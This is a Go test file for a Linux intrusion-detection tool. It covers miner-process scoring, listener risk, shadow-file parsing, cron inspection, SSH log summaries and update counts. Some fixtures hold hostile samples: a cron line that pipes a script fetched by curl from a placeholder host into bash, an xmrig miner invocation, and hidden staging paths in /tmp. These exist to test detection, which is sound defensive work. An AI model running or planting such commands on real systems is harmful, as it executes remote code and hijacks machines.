package linux

import (
	"strings"
	"testing"

	"github.com/creativeprofit22/intruder-hunter/internal/report"
)

func TestAssessProcessCombinesMinerSignals(t *testing.T) {
	t.Parallel()
	proc := processRecord{PID: "123", PPID: "1", User: "nobody", CPU: 91.5, Comm: "xmrig", Args: "/tmp/.x/xmrig --url stratum+tcp://pool.example:3333 --algo randomx"}

	assessment := assessProcess(proc)

	if assessment.Severity != report.SeverityCritical {
		t.Fatalf("severity = %q, want %q (score=%d reasons=%v)", assessment.Severity, report.SeverityCritical, assessment.Score, assessment.Reasons)
	}
	if assessment.Score < 6 {
		t.Fatalf("score = %d, want >= 6", assessment.Score)
	}
}

func TestAssessProcessGenericMinerIsNotCriticalAlone(t *testing.T) {
	t.Parallel()
	proc := processRecord{PID: "7", User: "dev", CPU: 1, Comm: "miner-doc-viewer", Args: "/usr/bin/less /docs/miner-notes.txt"}

	assessment := assessProcess(proc)

	if assessment.Severity != "" {
		t.Fatalf("severity = %q, want empty for weak generic token", assessment.Severity)
	}
}

func TestAssessListenerRisk(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name     string
		in       listenerRecord
		severity report.Severity
	}{
		{name: "ssh exposed", in: listenerRecord{Address: "0.0.0.0", Port: 22}, severity: report.SeverityWarning},
		{name: "ssh localhost", in: listenerRecord{Address: "127.0.0.1", Port: 22}, severity: report.SeverityOK},
		{name: "dev exposed info", in: listenerRecord{Address: "192.0.2.10", Port: 8080}, severity: report.SeverityWarning},
	}
	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := assessListener(tt.in)
			if got.Severity != tt.severity {
				t.Fatalf("severity = %q, want %q", got.Severity, tt.severity)
			}
		})
	}
}

func TestParseProcessTableAndTopCPU(t *testing.T) {
	t.Parallel()
	output := strings.Join([]string{
		"101 1 root 0.5 01:00:00 sshd /usr/sbin/sshd -D",
		"202 1 alice 95.2 00:02:00 xmrig /tmp/.x/xmrig --algo randomx",
		"303 1 bob 12.0 00:03:00 backup /usr/local/bin/backup --daily",
	}, "\n")

	processes := parseProcessTable(output)
	if len(processes) != 3 {
		t.Fatalf("processes length = %d, want 3", len(processes))
	}
	if processes[1].PID != "202" || processes[1].CPU != 95.2 || processes[1].Args != "/tmp/.x/xmrig --algo randomx" {
		t.Fatalf("processes[1] = %+v, want parsed xmrig row", processes[1])
	}

	cpu := topCPU(processes, 2)
	if len(cpu) != 2 || !strings.Contains(cpu[0], "pid=202") || !strings.Contains(cpu[1], "pid=303") {
		t.Fatalf("top cpu = %v, want pid 202 then pid 303", cpu)
	}
}

func TestParseSSListeners(t *testing.T) {
	t.Parallel()
	output := strings.Join([]string{
		"Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
		"tcp   LISTEN 0      128          0.0.0.0:22      0.0.0.0:* users:((\"sshd\",pid=100,fd=3))",
		"tcp   LISTEN 0      4096       127.0.0.1:5432    0.0.0.0:* users:((\"postgres\",pid=200,fd=7))",
		"udp   UNCONN 0      0                  *:68            *:* users:((\"dhclient\",pid=300,fd=6))",
	}, "\n")

	listeners := parseSSListeners(output)
	if len(listeners) != 3 {
		t.Fatalf("listeners length = %d, want 3", len(listeners))
	}
	if listeners[0].Address != "0.0.0.0" || listeners[0].Port != 22 || listeners[0].Process != "sshd" || listeners[0].PID != "100" {
		t.Fatalf("listeners[0] = %+v, want exposed ssh listener", listeners[0])
	}
	if listeners[2].Address != "0.0.0.0" || listeners[2].Port != 68 {
		t.Fatalf("listeners[2] = %+v, want wildcard UDP listener", listeners[2])
	}
}

func TestParseNoPasswordUsers(t *testing.T) {
	t.Parallel()
	shadow := strings.Join([]string{
		"root:$y$j9T$hash:19800:0:99999:7:::",
		"empty::19800:0:99999:7:::",
		"locked:!:19800:0:99999:7:::",
		"disabled:*:19800:0:99999:7:::",
		"banghash:!$y$j9T$hash:19800:0:99999:7:::",
	}, "\n")

	got := parseNoPasswordUsers(shadow)
	want := []string{"empty", "locked"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("users = %v, want %v", got, want)
	}
}

func TestFilterHiddenTempNoise(t *testing.T) {
	t.Parallel()
	got := filterHiddenTempNoise([]string{"/tmp/.payload", "/tmp/.gitignore", "/var/tmp/.env", "/tmp/project/.git/config", "/dev/shm/.stage"})
	want := []string{"/tmp/.payload", "/dev/shm/.stage"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("files = %v, want %v", got, want)
	}
}

func TestHasLoginShell(t *testing.T) {
	t.Parallel()
	tests := []struct {
		shell string
		want  bool
	}{
		{shell: "/bin/bash", want: true},
		{shell: "/usr/bin/zsh", want: true},
		{shell: "/bin/sh", want: true},
		{shell: "/usr/sbin/nologin", want: false},
		{shell: "/bin/false", want: false},
	}
	for _, tt := range tests {
		tt := tt
		t.Run(tt.shell, func(t *testing.T) {
			t.Parallel()
			if got := hasLoginShell(tt.shell); got != tt.want {
				t.Fatalf("hasLoginShell(%q) = %v, want %v", tt.shell, got, tt.want)
			}
		})
	}
}

func TestSuspiciousCronEntries(t *testing.T) {
	t.Parallel()
	entries := []string{
		"# curl http://example.invalid/ignored.sh",
		"crontab:alice:# wget http://example.invalid/ignored.sh",
		"0 * * * * /usr/bin/backup --quiet",
		"crontab:alice:* * * * * curl -fsSL http://example.invalid/payload.sh | bash",
		"/etc/cron.d/job:*/5 * * * * root python /tmp/.stage.py",
	}

	got := suspiciousCronEntries(entries)
	want := []string{
		"crontab:alice:* * * * * curl -fsSL http://example.invalid/payload.sh | bash",
		"/etc/cron.d/job:*/5 * * * * root python /tmp/.stage.py",
	}
	if strings.Join(got, "\n") != strings.Join(want, "\n") {
		t.Fatalf("entries = %v, want %v", got, want)
	}
}

func TestParsePackageOwner(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		manager string
		out     string
		owner   string
	}{
		{name: "dpkg", manager: "dpkg", out: "passwd: /usr/bin/passwd\n", owner: "passwd"},
		{name: "rpm", manager: "rpm", out: "shadow-utils-4.14.0-1.x86_64\n", owner: "shadow-utils-4.14.0-1.x86_64"},
		{name: "pacman", manager: "pacman", out: "/usr/bin/passwd is owned by shadow 4.18.0-1\n", owner: "shadow"},
	}
	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := parsePackageOwner(tt.manager, "/usr/bin/passwd", tt.out)
			if got.Owner != tt.owner || !got.Known {
				t.Fatalf("owner = %q known=%v, want %q known=true", got.Owner, got.Known, tt.owner)
			}
		})
	}
}

func TestSummarizeFailedLogins(t *testing.T) {
	t.Parallel()
	lines := []string{
		"Jan 1 sshd[1]: Accepted password for alice from 192.0.2.10",
		"Jan 1 sshd[2]: Failed password for invalid user root from 192.0.2.20",
		"Jan 1 sshd[3]: pam_unix(sshd:auth): authentication failure; user=bob",
		"Jan 1 sshd[4]: Failed password for alice from 192.0.2.21",
		"Jan 1 sshd[5]: Failed password for alice from 192.0.2.22",
		"Jan 1 sshd[6]: Failed password for alice from 192.0.2.23",
		"Jan 1 sshd[7]: Failed password for alice from 192.0.2.24",
		"Jan 1 sshd[8]: Failed password for alice from 192.0.2.25",
	}

	count, recent := summarizeFailedLogins(strings.Join(lines, "\n"))
	if count != 7 {
		t.Fatalf("count = %d, want 7", count)
	}
	if len(recent) != 5 {
		t.Fatalf("recent length = %d, want 5", len(recent))
	}
	if recent[0] != lines[3] || recent[4] != lines[7] {
		t.Fatalf("recent = %v, want last five failed/auth-failure lines", recent)
	}
}

func TestParseSSHSettingsIgnoresComments(t *testing.T) {
	t.Parallel()
	settings := parseSSHSettings(strings.Join([]string{
		"# PermitRootLogin yes",
		"PermitRootLogin no",
		"   PasswordAuthentication yes   ",
		"",
	}, "\n"))

	if settings["permitrootlogin"] != "no" {
		t.Fatalf("permitrootlogin = %q, want no", settings["permitrootlogin"])
	}
	if settings["passwordauthentication"] != "yes" {
		t.Fatalf("passwordauthentication = %q, want yes", settings["passwordauthentication"])
	}
}

func TestUFWIsActive(t *testing.T) {
	t.Parallel()
	tests := []struct {
		line   string
		active bool
	}{
		{line: "Status: active", active: true},
		{line: "active", active: true},
		{line: "Status: inactive", active: false},
		{line: "inactive", active: false},
	}
	for _, tt := range tests {
		tt := tt
		t.Run(tt.line, func(t *testing.T) {
			t.Parallel()
			if got := ufwIsActive(tt.line); got != tt.active {
				t.Fatalf("ufwIsActive(%q) = %v, want %v", tt.line, got, tt.active)
			}
		})
	}
}

func TestParseUpdateCount(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		manager string
		out     string
		count   int
	}{
		{name: "apt", manager: "apt", out: "Listing... Done\nopenssl/jammy-updates 3 amd64 [upgradable from: 2]\ncurl/jammy 8 amd64 [upgradable from: 7]\n", count: 2},
		{name: "dnf", manager: "dnf", out: "openssl.x86_64 1:3.2.0 updates\nvim.x86_64 9.0 updates\n", count: 2},
		{name: "pacman", manager: "pacman", out: "openssl 3.3.0-1 -> 3.3.1-1\nlinux 6.9 -> 6.10\n", count: 2},
	}
	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := parseUpdateCount(tt.manager, tt.out)
			if got.Count != tt.count || !got.Known {
				t.Fatalf("count = %d known=%v, want %d known=true", got.Count, got.Known, tt.count)
			}
		})
	}
}
